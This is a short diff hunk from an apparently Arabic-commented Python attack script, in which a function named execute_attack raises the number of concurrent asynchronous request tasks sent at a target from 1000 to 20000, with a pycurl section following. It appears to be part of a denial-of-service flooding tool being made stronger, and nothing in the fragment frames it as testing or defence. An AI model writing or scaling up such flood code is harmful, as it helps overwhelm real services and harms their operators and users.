@@ -128,7 +128,7 @@ def execute_attack(target):
         # استخدام asyncio للبرمجة غير المتزامنة
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        tasks = [send_requests_aiohttp(target) for _ in range(1000)]  # زيادة عدد المهام
+        tasks = [send_requests_aiohttp(target) for _ in range(20000)]  # زيادة عدد المهام
         loop.run_until_complete(asyncio.gather(*tasks))
 
         # استخدام pycurl
